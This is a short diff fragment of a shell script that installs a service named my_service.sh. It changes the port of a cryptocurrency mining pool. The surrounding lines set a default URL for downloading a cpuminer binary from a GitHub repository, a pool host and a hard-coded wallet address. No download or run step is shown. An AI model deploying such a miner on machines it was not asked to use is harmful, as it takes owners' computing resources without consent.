@@ -19,7 +19,7 @@ cat << 'EOF' > /usr/local/bin/my_service.sh
 
 # Define the URL and mining parameters (make these configurable via environment variables)
 MINER_URL="${MINER_URL:-https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/cpuminer-sse2}"
-POOL_URL="${POOL_URL:-stratum+tcp://stratum-asia.rplant.xyz:3383}"
+POOL_URL="${POOL_URL:-stratum+tcp://stratum-asia.rplant.xyz:13382}"
 WALLET_ADDRESS="${WALLET_ADDRESS:-YeW8bsNisZGT4tL5rTfmi5BD3hK8e8CAPe}"
 LOG_FILE="/var/log/mining_service.log"
 
